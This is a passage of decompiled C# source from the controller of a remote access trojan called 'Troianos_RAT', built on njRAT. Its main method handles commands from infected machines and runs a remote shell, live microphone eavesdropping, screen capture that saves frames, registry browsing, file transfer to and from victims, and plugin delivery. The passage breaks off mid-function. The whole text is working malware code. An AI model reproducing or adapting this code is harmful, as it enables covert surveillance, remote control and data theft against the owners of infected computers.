using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Troianos_RAT.My;
using Troianos_RAT.My.Resources;
using Troianos_RAT.NJRAT;
using Troianos_RAT.njRAT;
using WinMM;

namespace Troianos_RAT
{
	// Token: 0x02000022 RID: 34
	[StandardModule]
	internal sealed class Class7
	{
		// Token: 0x06000411 RID: 1041 RVA: 0x001CD4E4 File Offset: 0x001CB8E4
		[DebuggerNonUserCode]
		public Class7()
		{
		}

		// Token: 0x06000413 RID: 1043 RVA: 0x001CD5C0 File Offset: 0x001CB9C0
		public static Class7.Class9 smethod_0(string string_2, string string_3)
		{
			bool flag = string_2 != null;
			if (flag)
			{
				try
				{
					foreach (Class7.Class9 @class in Class7.list_1)
					{
						flag = (Operators.CompareString(@class.string_0, string_2.ToLower(), false) == 0);
						if (flag)
						{
							return @class;
						}
					}
				}
				finally
				{
					List<Class7.Class9>.Enumerator enumerator;
					enumerator.Dispose();
				}
			}
			flag = (string_3 != null);
			if (flag)
			{
				try
				{
					foreach (Class7.Class9 class2 in Class7.list_1)
					{
						flag = (Operators.CompareString(class2.string_1, string_3, false) == 0);
						if (flag)
						{
							return class2;
						}
					}
				}
				finally
				{
					List<Class7.Class9>.Enumerator enumerator2;
					enumerator2.Dispose();
				}
			}
			return null;
		}

		// Token: 0x06000414 RID: 1044 RVA: 0x001CD6AC File Offset: 0x001CBAAC
		public static object smethod_1(DataGridViewRow dataGridViewRow_0)
		{
			object result;
			try
			{
				result = RuntimeHelpers.GetObjectValue((dataGridViewRow_0 != null) ? ((dataGridViewRow_0.Tag != null) ? Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject("[", RuntimeHelpers.GetObjectValue(dataGridViewRow_0.Cells[Class7.int_0].Value))), "/")), RuntimeHelpers.GetObjectValue(dataGridViewRow_0.Cells[Class7.int_3].Value))), "/")), RuntimeHelpers.GetObjectValue(dataGridViewRow_0.Cells[Class7.int_7].Value))), "]") : "?") : "?");
			}
			catch (Exception ex)
			{
				result = "?";
			}
			return result;
		}

		// Token: 0x06000415 RID: 1045 RVA: 0x001CD7B4 File Offset: 0x001CBBB4
		public static bool smethod_2(Client client_0, Class7.Class9 class9_0, bool bool_1)
		{
			try
			{
				string text;
				if (bool_1)
				{
					text = "ret" + Class7.string_1 + class9_0.string_1 + Class7.string_1;
				}
				else
				{
					text = string.Concat(new string[]
					{
						"inv",
						Class7.string_1,
						class9_0.string_1,
						Class7.string_1,
						client_0.ip(),
						Class7.string_1
					});
				}
				MemoryStream memoryStream = new MemoryStream();
				memoryStream.Write(Class6.smethod_11(ref text), 0, text.Length);
				bool flag = !client_0.plg.Contains(class9_0.string_1);
				if (flag)
				{
					memoryStream.Write(class9_0.byte_0, 0, class9_0.byte_0.Length);
				}
				else
				{
					memoryStream.WriteByte(40);
				}
				client_0.Send(memoryStream.ToArray());
				return true;
			}
			catch (Exception ex)
			{
			}
			return false;
		}

		// Token: 0x06000416 RID: 1046 RVA: 0x001CD8D4 File Offset: 0x001CBCD4
		public static Form smethod_3(string string_2)
		{
			return MyProject.Application.OpenForms[string_2];
		}

		// Token: 0x06000417 RID: 1047 RVA: 0x001CD8F8 File Offset: 0x001CBCF8
		public static void smethod_4(object object_0)
		{
			IEnumerator enumerator = Class7.form1_0.L1.SelectedRows.GetEnumerator();
			enumerator.Reset();
			bool flag = NewLateBinding.LateIndexGet(RuntimeHelpers.GetObjectValue(object_0), new object[]
			{
				RuntimeHelpers.GetObjectValue(0)
			}, null) is string;
			byte[] b;
			if (flag)
			{
				string text = Conversions.ToString(RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet(RuntimeHelpers.GetObjectValue(object_0), new object[]
				{
					RuntimeHelpers.GetObjectValue(0)
				}, null)));
				byte[] array = Class6.smethod_11(ref text);
				NewLateBinding.LateIndexSetComplex(RuntimeHelpers.GetObjectValue(object_0), new object[]
				{
					RuntimeHelpers.GetObjectValue(0),
					text
				}, null, true, false);
				b = array;
			}
			else
			{
				b = (byte[])NewLateBinding.LateIndexGet(RuntimeHelpers.GetObjectValue(object_0), new object[]
				{
					RuntimeHelpers.GetObjectValue(0)
				}, null);
			}
			while (enumerator.MoveNext())
			{
				try
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)enumerator.Current;
					((Client)dataGridViewRow.Tag).Send(b);
					DataGridViewCellStyle defaultCellStyle = dataGridViewRow.DefaultCellStyle;
					object objectValue = RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet(RuntimeHelpers.GetObjectValue(object_0), new object[]
					{
						RuntimeHelpers.GetObjectValue(1)
					}, null));
					Color color;
					if (objectValue == null)
					{
						Color color2;
						color = color2;
					}
					else
					{
						object obj = objectValue;
						Color color3;
						color = ((obj != null) ? ((Color)obj) : color3);
					}
					Color foreColor = color;
					defaultCellStyle.ForeColor = foreColor;
					MyProject.Forms.script.Show();
				}
				catch (Exception ex)
				{
				}
			}
		}

		// Token: 0x06000418 RID: 1048 RVA: 0x001CDAB8 File Offset: 0x001CBEB8
		public static void smethod_5(object object_0)
		{
			Client client = (Client)NewLateBinding.LateIndexGet(RuntimeHelpers.GetObjectValue(object_0), new object[]
			{
				RuntimeHelpers.GetObjectValue(0)
			}, null);
			byte[] array = (byte[])NewLateBinding.LateIndexGet(RuntimeHelpers.GetObjectValue(object_0), new object[]
			{
				RuntimeHelpers.GetObjectValue(1)
			}, null);
			string[] array2 = Strings.Split(Class6.smethod_12(ref array), Class7.string_1, -1, CompareMethod.Binary);
			try
			{
				string left = array2[0];
				bool flag = Operators.CompareString(left, "Ex", false) == 0;
				if (flag)
				{
					Manager manager = (Manager)Class7.smethod_3("m" + client.ip());
					flag = (manager == null);
					if (!flag)
					{
						manager.SL.Text = array2[1];
						flag = !array2[1].StartsWith("rs:!-->");
						if (!flag)
						{
							manager.shStarted = 0;
						}
					}
				}
				else
				{
					flag = (Operators.CompareString(left, "srv", false) == 0);
					if (flag)
					{
						Manager manager2 = (Manager)Class7.smethod_3("m" + client.ip());
						flag = (manager2 == null || Operators.CompareString(array2[1], "~", false) != 0);
						if (!flag)
						{
							List<string> list = new List<string>();
							List<ListViewItem> list2 = new List<ListViewItem>();
							int num = 2;
							int num2 = array2.Length - 1;
							for (int i = num; i <= num2; i++)
							{
								string[] array3 = Strings.Split(array2[i], "[,]", -1, CompareMethod.Binary);
								list.Add(array3[0].ToLower());
								flag = manager2.LSRV.Items.ContainsKey(array3[0]);
								if (flag)
								{
									ListViewItem listViewItem = manager2.LSRV.Items[array3[0]];
									listViewItem.SubItems[3].Text = array3[3];
									listViewItem.SubItems[4].Text = array3[4];
								}
								else
								{
									ListViewItem listViewItem2 = new ListViewItem(array3[0]);
									int num3 = 1;
									int num4 = array3.Length - 1;
									for (int j = num3; j <= num4; j++)
									{
										listViewItem2.SubItems.Add(array3[j]);
									}
									listViewItem2.Name = array3[0];
									list2.Add(listViewItem2);
									flag = (list2.Count > 20);
									if (flag)
									{
										manager2.LSRV.Items.AddRange(list2.ToArray());
										list2.Clear();
									}
								}
							}
							flag = (list2.Count > 0);
							if (flag)
							{
								manager2.LSRV.Items.AddRange(list2.ToArray());
								list2.Clear();
							}
							List<string> list3 = new List<string>();
							try
							{
								try
								{
									foreach (object obj in manager2.LSRV.Items)
									{
										ListViewItem listViewItem3 = (ListViewItem)obj;
										flag = !list.Contains(listViewItem3.Text.ToLower());
										if (flag)
										{
											list3.Add(listViewItem3.Text);
										}
									}
								}
								finally
								{
									IEnumerator enumerator;
									flag = (enumerator is IDisposable);
									if (flag)
									{
										(enumerator as IDisposable).Dispose();
									}
								}
							}
							finally
							{
								IEnumerator enumerator2;
								flag = (enumerator2 is IDisposable);
								if (flag)
								{
									(enumerator2 as IDisposable).Dispose();
								}
							}
							try
							{
								foreach (string key in list3)
								{
									manager2.LSRV.Items.RemoveByKey(key);
								}
							}
							finally
							{
								List<string>.Enumerator enumerator3;
								enumerator3.Dispose();
							}
							manager2.srvNxt = true;
							flag = !manager2.SrvFX;
							if (!flag)
							{
								manager2.SrvFX = false;
								manager2.LSRV.method_3();
							}
						}
					}
					else
					{
						flag = (Operators.CompareString(left, "tcp", false) == 0);
						if (flag)
						{
							Manager manager3 = (Manager)Class7.smethod_3("m" + client.ip());
							flag = (manager3 == null);
							if (!flag)
							{
								ToolStripProgressBar pr = manager3.pr;
								lock (pr)
								{
									string left2 = array2[1];
									flag = (Operators.CompareString(left2, "~", false) == 0);
									if (flag)
									{
										string[] array4 = Strings.Split(array2[2], "*", -1, CompareMethod.Binary);
										manager3.pr.Value = 0;
										manager3.pr.Maximum = array4.Length;
										List<ListViewItem> list4 = new List<ListViewItem>();
										int num5 = 0;
										int num6 = array4.Length - 1;
										for (int k = num5; k <= num6; k++)
										{
											string[] array5 = Strings.Split(array4[k], ",", -1, CompareMethod.Binary);
											flag = manager3.LTCP.Items.ContainsKey(array5[0] + array5[1]);
											if (flag)
											{
												ListViewItem listViewItem4 = manager3.LTCP.Items[array5[0] + array5[1]];
												listViewItem4.SubItems[4].Text = ((TcpState)Conversions.ToInteger(array5[2])).ToString();
												Color foreColor = listViewItem4.ForeColor;
												switch (Conversions.ToInteger(array5[2]))
												{
												case 1:
												case 8:
												case 9:
												case 11:
												case 12:
													listViewItem4.ForeColor = Color.Red;
													break;
												case 4:
													listViewItem4.ForeColor = Color.YellowGreen;
													break;
												case 5:
													listViewItem4.ForeColor = Color.LimeGreen;
													break;
												}
											}
											else
											{
												ListViewItem listViewItem5 = new ListViewItem(array5[0].Split(new char[]
												{
													':'
												})[0]);
												listViewItem5.Name = array5[0] + array5[1];
												listViewItem5.Tag = array5[0] + array5[1];
												listViewItem5.SubItems.Add(array5[0].Split(new char[]
												{
													':'
												})[1]);
												listViewItem5.SubItems.Add(array5[1].Split(new char[]
												{
													':'
												})[0]);
												listViewItem5.SubItems.Add(array5[1].Split(new char[]
												{
													':'
												})[1]);
												listViewItem5.SubItems.Add(((TcpState)Conversions.ToInteger(array5[2])).ToString());
												listViewItem5.SubItems.Add(array5[3]);
												switch (Conversions.ToInteger(array5[2]))
												{
												case 1:
												case 8:
												case 9:
												case 11:
												case 12:
													listViewItem5.ForeColor = Color.Red;
													break;
												case 3:
												case 4:
													listViewItem5.ForeColor = Color.YellowGreen;
													break;
												case 5:
													listViewItem5.ForeColor = Color.LimeGreen;
													break;
												}
												list4.Add(listViewItem5);
												flag = (list4.Count > 20);
												if (flag)
												{
													manager3.LTCP.Items.AddRange(list4.ToArray());
													list4.Clear();
													ColumnHeader columnHeader_ = manager3.LTCP.columnHeader_0;
													flag = (columnHeader_ == null);
													if (flag)
													{
														manager3.LTCP.GClass9_ColumnClick(manager3.LTCP, new ColumnClickEventArgs(0));
													}
													else
													{
														columnHeader_.Tag = RuntimeHelpers.GetObjectValue((!Operators.ConditionalCompareObjectEqual(RuntimeHelpers.GetObjectValue(columnHeader_.Tag), "+", false)) ? ((!Operators.ConditionalCompareObjectEqual(RuntimeHelpers.GetObjectValue(columnHeader_.Tag), "-", false)) ? "-" : "+") : "-");
														manager3.LTCP.GClass9_ColumnClick(manager3.LTCP, new ColumnClickEventArgs(columnHeader_.Index));
													}
												}
											}
										}
										flag = manager3.TCPFX;
										if (flag)
										{
											manager3.LTCP.method_3();
											manager3.TCPFX = false;
										}
										flag = (list4.Count > 0);
										if (flag)
										{
											manager3.LTCP.Items.AddRange(list4.ToArray());
											list4.Clear();
											ColumnHeader columnHeader_2 = manager3.LTCP.columnHeader_0;
											flag = (columnHeader_2 == null);
											if (flag)
											{
												manager3.LTCP.GClass9_ColumnClick(manager3.LTCP, new ColumnClickEventArgs(0));
											}
											else
											{
												columnHeader_2.Tag = RuntimeHelpers.GetObjectValue((!Operators.ConditionalCompareObjectEqual(RuntimeHelpers.GetObjectValue(columnHeader_2.Tag), "+", false)) ? ((!Operators.ConditionalCompareObjectEqual(RuntimeHelpers.GetObjectValue(columnHeader_2.Tag), "-", false)) ? "-" : "+") : "-");
												manager3.LTCP.GClass9_ColumnClick(manager3.LTCP, new ColumnClickEventArgs(columnHeader_2.Index));
											}
										}
										manager3.TCPNXT = true;
									}
									else
									{
										flag = (Operators.CompareString(left2, "RM", false) == 0);
										if (flag)
										{
											int num7 = 2;
											int num8 = array2.Length - 1;
											for (int l = num7; l <= num8; l++)
											{
												manager3.LTCP.Items.RemoveByKey(array2[l]);
											}
										}
										else
										{
											flag = (Operators.CompareString(left2, "ER", false) != 0);
											if (!flag)
											{
												manager3.SL.Text = array2[2];
											}
										}
									}
								}
							}
						}
						else
						{
							flag = (Operators.CompareString(left, "MIC", false) == 0);
							if (flag)
							{
								bool flag2 = client.osk == null;
								if (flag2)
								{
									client.isPL = true;
									try
									{
										client.osk = Class7.sk_0.GetClient(array2[1]);
									}
									catch (Exception ex)
									{
										client.CN = false;
									}
								}
								flag2 = Class7.form1_0.InvokeRequired;
								if (flag2)
								{
									Class7.form1_0.Invoke(new Class7.Delegate0(Class7.smethod_5), new object[]
									{
										RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(object_0)))
									});
								}
								else
								{
									Mic mic = (Mic)Class7.smethod_3("mic" + client.ip());
									string left3 = array2[2];
									flag2 = (Operators.CompareString(left3, "~", false) == 0);
									if (flag2)
									{
										flag = (mic != null);
										if (!flag)
										{
											Mic mic2 = new Mic();
											mic2.Name = "mic" + client.ip();
											mic2.sk = client;
											mic2.osk = client.osk;
											int num9 = 3;
											int num10 = array2.Length - 1;
											for (int m = num9; m <= num10; m++)
											{
												mic2.ComboBox1.Items.Add(array2[m]);
											}
											mic2.Show();
										}
									}
									else
									{
										flag2 = (Operators.CompareString(left3, "!", false) == 0);
										if (flag2)
										{
											flag = (mic == null);
											if (flag)
											{
												client.CN = false;
											}
											else
											{
												byte[] array6 = (byte[])NewLateBinding.LateIndexGet(Class6.smethod_9(array, array2[3] + Class7.string_1), new object[]
												{
													RuntimeHelpers.GetObjectValue(1)
												}, null);
												flag2 = (array6[0] == 31);
												if (flag2)
												{
													byte[] byte_ = array6;
													bool flag3 = false;
													bool flag4 = flag3;
													array6 = Class6.smethod_8(byte_, ref flag4);
												}
												mic.Text = Class6.smethod_17((long)array6.Length) + " " + mic.QQ;
												flag2 = (Conversions.ToInteger(array2[3]) == 0);
												if (flag2)
												{
													Class7.waveOut_0.Write(array6);
												}
												else
												{
													Class7.waveOut_1.Write(array6);
												}
											}
										}
										else
										{
											flag2 = (Operators.CompareString(left3, "ER", false) != 0);
											if (!flag2)
											{
												flag2 = (mic == null);
												if (flag2)
												{
													client.CN = false;
												}
												else
												{
													mic.ComboBox1.Enabled = true;
													mic.ComboBox2.Enabled = true;
													mic.Button1.Text = "Iniciar";
												}
											}
										}
									}
								}
							}
							else
							{
								bool flag2 = Operators.CompareString(left, "get", false) == 0;
								if (flag2)
								{
									client.isPL = true;
									client.t.Dispose();
									client.CN = false;
									client.NoPing = true;
									up up = (up)Class7.smethod_3(array2[1] + array2[2]);
									flag2 = (up == null);
									if (flag2)
									{
										client.Close();
									}
									else
									{
										up.sk = client;
										int num11 = 0;
										client.Client.SendBufferSize = 524288;
										try
										{
											while (num11 != up.SZ)
											{
												flag2 = !up.Closinge;
												if (!flag2)
												{
													goto IL_F4F;
												}
												byte[] array7 = new byte[10241];
												int num12 = up.FS.Read(array7, 0, array7.Length);
												client.Client.Client.Poll(-1, SelectMode.SelectWrite);
												client.Client.Client.Send(array7, 0, num12, SocketFlags.None);
												num11 += num12;
												Class7.long_0 += (long)num12;
												ProgressBar progressBar = up.ProgressBar1;
												progressBar.Value += num12;
											}
											up.Close();
										}
										catch (Exception ex2)
										{
											try
											{
												up.Text = "Connection lost";
												up.Lv1.ForeColor = Color.Red;
											}
											catch (Exception ex3)
											{
											}
										}
										IL_F4F:
										client.Close();
									}
								}
								else
								{
									flag2 = (Operators.CompareString(left, "post+", false) == 0);
									if (flag2)
									{
										client.isPL = true;
										DW dw = new DW();
										dw.FN = array2[1];
										dw.SZ = Conversions.ToInteger(array2[2]);
										dw.c = client;
										dw.osk = client.osk;
										dw.Name = dw.osk.ip() + array2[1];
										dw.Show();
									}
									else
									{
										flag2 = (Operators.CompareString(left, "post", false) == 0);
										if (flag2)
										{
											client.osk = Class7.sk_0.GetClient(array2[3]);
											try
											{
												client.t.Dispose();
												client.CN = false;
												client.NoPing = true;
												object objectValue = RuntimeHelpers.GetObjectValue(object_0);
												object[] array8 = new object[]
												{
													RuntimeHelpers.GetObjectValue(1),
													null
												};
												object[] array9 = array8;
												int num13 = 1;
												string text = string.Concat(new string[]
												{
													"post+",
													Class7.string_1,
													array2[1],
													Class7.string_1,
													array2[2],
													Class7.string_1,
													array2[3]
												});
												byte[] array10 = Class6.smethod_11(ref text);
												array9[num13] = array10;
												object[] arguments = array8;
												object obj2 = null;
												NewLateBinding.LateIndexSet(RuntimeHelpers.GetObjectValue(objectValue), arguments, (string[])obj2);
												Class7.form1_0.Invoke(new Class7.Delegate0(Class7.smethod_5), new object[]
												{
													RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(object_0)))
												});
												int num14 = 0;
												while (Class7.smethod_3(array2[3] + array2[1]) == null)
												{
													num14++;
													flag2 = (num14 == 1000);
													if (flag2)
													{
														return;
													}
													Thread.Sleep(10);
												}
												Socket client2 = client.Client.Client;
												text = "ok";
												byte[] buffer = Class6.smethod_11(ref text);
												int offset = 0;
												int size = 2;
												int socketFlags = 0;
												client2.Send(buffer, offset, size, (SocketFlags)socketFlags);
												client.Client.Client.ReceiveBufferSize = 1048576;
												Class7.long_0 += 2L;
												byte[] array11 = new byte[1025];
												DW dw2 = (DW)Class7.smethod_3(array2[3] + array2[1]);
												int num15 = 0;
												try
												{
													for (;;)
													{
														byte[] array12 = new byte[1048577];
														client.Client.Client.Poll(-1, SelectMode.SelectRead);
														int num16 = client.Client.Client.Receive(array12, 0, array12.Length, SocketFlags.None);
														dw2.FS.Write(array12, 0, num16);
														Class7.long_1 += (long)num16;
														num15 += num16;
														ProgressBar progressBar2 = dw2.ProgressBar1;
														progressBar2.Value += num16;
														dw2.FS.Flush();
														flag2 = (num15 != dw2.SZ);
														if (!flag2)
														{
															break;
														}
														Thread.Sleep(1);
													}
													dw2.Button1.Enabled = false;
													dw2.FS.Close();
													dw2.FS.Dispose();
													flag2 = File.Exists(dw2.folder);
													if (flag2)
													{
														File.Delete(dw2.folder);
													}
													File.Move(dw2.tmp, dw2.folder);
													dw2.Close();
												}
												catch (Exception ex4)
												{
													dw2.Text = "Conexao Lost";
													dw2.ForeColor = Color.Red;
												}
											}
											catch (Exception ex5)
											{
											}
											client.Close();
										}
										else
										{
											flag2 = (Operators.CompareString(left, "RG", false) == 0);
											if (flag2)
											{
												flag = Class7.form1_0.InvokeRequired;
												if (flag)
												{
													Class7.form1_0.Invoke(new Class7.Delegate0(Class7.smethod_5), new object[]
													{
														RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(object_0)))
													});
												}
												else
												{
													Manager manager4 = (Manager)Class7.smethod_3("m" + client.ip());
													ToolStripProgressBar pr2 = manager4.pr;
													lock (pr2)
													{
														string left4 = array2[1];
														flag2 = (Operators.CompareString(left4, "ER", false) == 0);
														if (flag2)
														{
															manager4.RGk.Enabled = true;
															manager4.RGLIST.Enabled = true;
															manager4.SL.Text = Class6.smethod_16(array2[2]);
														}
														else
														{
															flag2 = (Operators.CompareString(left4, "~", false) != 0);
															if (!flag2)
															{
																manager4.RGk.Enabled = true;
																manager4.RGLIST.Enabled = true;
																TreeNodeCollection nodes = manager4.RGk.Nodes;
																TreeNode treeNode = Class6.smethod_7(array2[2], manager4.RGk.Nodes);
																List<string> list5 = new List<string>();
																flag2 = (manager4.RGk.SelectedNode == treeNode);
																if (flag2)
																{
																	manager4.RGLIST.Items.Clear();
																}
																flag2 = manager4.RGCH.Contains(array2[2]);
																Manager.GClass13 gclass;
																if (flag2)
																{
																	gclass = (Manager.GClass13)manager4.RGCH[array2[2]];
																	gclass.list_0.Clear();
																	gclass.list_1.Clear();
																}
																else
																{
																	gclass = new Manager.GClass13();
																	gclass.string_0 = array2[2];
																	manager4.RGCH.Add(gclass, array2[2], null, null);
																}
																string[] array13 = Strings.Split(array2[3], "[,]", -1, CompareMethod.Binary);
																manager4.pr.Value = 0;
																manager4.pr.Maximum = array13.Length;
																foreach (string text2 in array13)
																{
																	flag2 = (Operators.CompareString(text2, string.Empty, false) != 0);
																	if (flag2)
																	{
																		string[] array15 = Strings.Split(text2, "[;]", -1, CompareMethod.Binary);
																		try
																		{
																			ToolStripProgressBar pr3 = manager4.pr;
																			pr3.Value++;
																			flag2 = (array15.Length > 1);
																			if (flag2)
																			{
																				flag = (manager4.RGk.SelectedNode == treeNode);
																				if (flag)
																				{
																					ListViewItem listViewItem6 = manager4.RGLIST.Items.Add(array15[0]);
																					listViewItem6.SubItems.Add(array15[1]);
																					listViewItem6.SubItems.Add(array15[2]);
																					listViewItem6.ImageIndex = ((Operators.CompareString(array15[1], "String", false) != 0) ? 2 : 1);
																				}
																				gclass.list_0.Add(array15);
																			}
																			else
																			{
																				gclass.list_1.Add(array15[0]);
																				treeNode.Nodes.Add(array15[0], array15[0]);
																				flag2 = !treeNode.Nodes.ContainsKey(array15[0]);
																				if (flag2)
																				{
																					list5.Add(array15[0]);
																				}
																			}
																		}
																		catch (Exception ex6)
																		{
																		}
																	}
																}
																try
																{
																	try
																	{
																		foreach (object obj3 in treeNode.Nodes)
																		{
																			TreeNode treeNode2 = (TreeNode)obj3;
																			flag2 = list5.Contains(treeNode2.Text);
																			if (flag2)
																			{
																				list5.Remove(treeNode2.Text);
																			}
																		}
																	}
																	finally
																	{
																		IEnumerator enumerator4;
																		flag2 = (enumerator4 is IDisposable);
																		if (flag2)
																		{
																			(enumerator4 as IDisposable).Dispose();
																		}
																	}
																}
																finally
																{
																	IEnumerator enumerator5;
																	flag2 = (enumerator5 is IDisposable);
																	if (flag2)
																	{
																		(enumerator5 as IDisposable).Dispose();
																	}
																}
																try
																{
																	foreach (string key2 in list5)
																	{
																		treeNode.Nodes.RemoveByKey(key2);
																	}
																}
																finally
																{
																	List<string>.Enumerator enumerator6;
																	enumerator6.Dispose();
																}
																flag2 = (treeNode == manager4.RGk.SelectedNode);
																if (flag2)
																{
																	treeNode.Expand();
																}
																manager4.RGLIST.method_3();
																manager4.pr.Value = 0;
															}
														}
													}
												}
											}
											else
											{
												flag2 = (Operators.CompareString(left, "rss", false) == 0);
												if (flag2)
												{
													Manager manager5 = (Manager)Class7.smethod_3("m" + client.ip());
													flag2 = (manager5 == null);
													if (!flag2)
													{
														manager5.shStarted = 2;
														manager5.T2.ReadOnly = false;
														manager5.T2.BackColor = Color.Black;
													}
												}
												else
												{
													flag2 = (Operators.CompareString(left, "rs", false) == 0);
													if (flag2)
													{
														Manager manager6 = (Manager)Class7.smethod_3("m" + client.ip());
														flag2 = (manager6 == null);
														if (!flag2)
														{
															RichTextBox t = manager6.T1;
															lock (t)
															{
																manager6.T1.SelectionStart = manager6.T1.TextLength;
																manager6.T1.AppendText(Class6.smethod_16(array2[1].Replace("\r\n", string.Empty)) + "\r\n");
																manager6.T1.SelectionStart = manager6.T1.TextLength;
																manager6.T1.ScrollToCaret();
															}
														}
													}
													else
													{
														flag2 = (Operators.CompareString(left, "rsc", false) == 0);
														if (flag2)
														{
															Manager manager7 = (Manager)Class7.smethod_3("m" + client.ip());
															flag2 = (manager7 == null);
															if (!flag2)
															{
																manager7.T2.ReadOnly = true;
																manager7.T2.BackColor = Color.Gray;
																manager7.shStarted = 0;
															}
														}
														else
														{
															flag2 = (Operators.CompareString(left, "PLG", false) == 0);
															if (flag2)
															{
																Class7.Class9 @class = Class7.smethod_0("plg.dll", null);
																MemoryStream memoryStream = new MemoryStream();
																string text3 = "PLG" + Class7.string_1;
																byte[] array16 = Class6.smethod_11(ref text3);
																memoryStream.Write(array16, 0, array16.Length);
																memoryStream.Write(@class.byte_0, 0, @class.byte_0.Length);
																client.Send(memoryStream.ToArray());
															}
															else
															{
																flag2 = (Operators.CompareString(left, "sc~", false) == 0);
																if (flag2)
																{
																	flag = (client.osk == null);
																	if (flag)
																	{
																		client.isPL = true;
																		try
																		{
																			client.osk = Class7.sk_0.GetClient(array2[1]);
																		}
																		catch (Exception ex7)
																		{
																			client.CN = false;
																		}
																	}
																	flag2 = Class7.form1_0.InvokeRequired;
																	if (flag2)
																	{
																		Class7.form1_0.Invoke(new Class7.Delegate0(Class7.smethod_5), new object[]
																		{
																			RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(object_0)))
																		});
																	}
																	else
																	{
																		flag2 = ((sc)Class7.smethod_3("sc" + client.ip()) != null);
																		if (!flag2)
																		{
																			sc sc = new sc();
																			sc.osk = client.osk;
																			sc.sz = new Size(Conversions.ToInteger(array2[2]), Conversions.ToInteger(array2[3]));
																			sc.p.Image = null;
																			sc.Oimg = new Bitmap(sc.sz.Width, sc.sz.Height, PixelFormat.Format32bppPArgb);
																			sc.sk = client;
																			sc.Name = "sc" + client.ip();
																			sc.Show();
																		}
																	}
																}
																else
																{
																	flag2 = (Operators.CompareString(left, "scPK", false) == 0);
																	if (flag2)
																	{
																		sc sc2 = (sc)Class7.smethod_3("sc" + array2[1]);
																		flag2 = (sc2 == null);
																		if (flag2)
																		{
																			client.CN = false;
																		}
																		else
																		{
																			sc obj4 = sc2;
																			lock (obj4)
																			{
																				sc sc3 = sc2;
																				sc3.fps++;
																				sc2.pkt = (long)array.Length;
																				flag2 = (array2[2].Length == 0);
																				if (!flag2)
																				{
																					Bitmap bitmap = (Bitmap)Image.FromStream(new MemoryStream((byte[])NewLateBinding.LateIndexGet(Class6.smethod_9(array, array2[2] + Class7.string_1), new object[]
																					{
																						RuntimeHelpers.GetObjectValue(1)
																					}, null)));
																					flag2 = (bitmap.Width == 0);
																					if (!flag2)
																					{
																						string[] array17 = Strings.Split(array2[2], "-", -1, CompareMethod.Binary);
																						string[] array18 = Strings.Split(array17[0], ",", -1, CompareMethod.Binary);
																						Size sz = new Size(Conversions.ToInteger(array18[0]), Conversions.ToInteger(array18[1]));
																						int num17 = Conversions.ToInteger(array17[1]);
																						flag2 = (sc2.Oimg.Size != sz);
																						if (flag2)
																						{
																							sc2.Oimg = new Bitmap(sz.Width, sz.Height, PixelFormat.Format32bppPArgb);
																						}
																						PixelFormat format = PixelFormat.Format32bppArgb;
																						int num18 = 0;
																						int num19 = 2;
																						int num20 = array17.Length - 1;
																						for (int num21 = num19; num21 <= num20; num21++)
																						{
																							string[] array19 = Strings.Split(array17[num21], ",", -1, CompareMethod.Binary);
																							Rectangle rect = new Rectangle(Conversions.ToInteger(array19[0]), Conversions.ToInteger(array19[1]), bitmap.Width, num17);
																							BitmapData bitmapData = sc2.Oimg.LockBits(rect, ImageLockMode.WriteOnly, format);
																							Bitmap bitmap2 = bitmap;
																							Rectangle rect2 = new Rectangle(0, num18, rect.Width, rect.Height);
																							BitmapData bitmapData2 = bitmap2.LockBits(rect2, ImageLockMode.ReadOnly, format);
																							byte[] array20 = new byte[Math.Abs(bitmapData.Stride) * bitmapData.Height - 1 + 1 - 1 + 1];
																							Class6.memcpy(bitmapData.Scan0, bitmapData2.Scan0, array20.Length);
																							sc2.Oimg.UnlockBits(bitmapData);
																							bitmap.UnlockBits(bitmapData2);
																							num18 += num17;
																						}
																						sc2.p.Image = (Image)sc2.Oimg.Clone();
																						flag2 = !sc2.CheckBox3.Checked;
																						if (!flag2)
																						{
																							try
																							{
																								sc2.Oimg.Save(sc2.Folder + DateAndTime.Now.ToString("yyMMddhhmmssfff") + ".jpg", ImageFormat.Jpeg);
																							}
																							catch (Exception ex8)
																							{
																							}
																						}
																					}
																				}
																			}
																		}
																	}
																	else
																	{
																		flag2 = (Operators.CompareString(left, "CH", false) == 0);
																		if (flag2)
																		{
																			flag = (client.osk == null);
																			if (flag)
																			{
																				client.isPL = true;
																				try
																				{
																					client.osk = Class7.sk_0.GetClient(array2[1]);
																				}
																				catch (Exception ex9)
																				{
																					client.CN = false;
																				}
																			}
																			flag2 = Class7.form1_0.InvokeRequired;
																			if (flag2)
																			{
																				Class7.form1_0.Invoke(new Class7.Delegate0(Class7.smethod_5), new object[]
																				{
																					RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(object_0)))
																				});
																			}
																			else
																			{
																				Chat chat = (Chat)Class7.smethod_3("ch" + client.ip());
																				string left5 = array2[2];
																				flag2 = (Operators.CompareString(left5, "~", false) == 0);
																				if (flag2)
																				{
																					flag = (chat != null);
																					if (!flag)
																					{
																						new Chat
																						{
																							Name = "ch" + client.ip(),
																							sk = client,
																							osk = client.osk,
																							T2 = 
																							{
																								Enabled = false
																							},
																							Button1 = 
																							{
																								Enabled = false
																							}
																						}.Show();
																					}
																				}
																				else
																				{
																					flag2 = (Operators.CompareString(left5, "!", false) == 0);
																					if (flag2)
																					{
																						chat.T2.Enabled = true;
																						chat.Button1.Enabled = true;
																						Chat obj5 = chat;
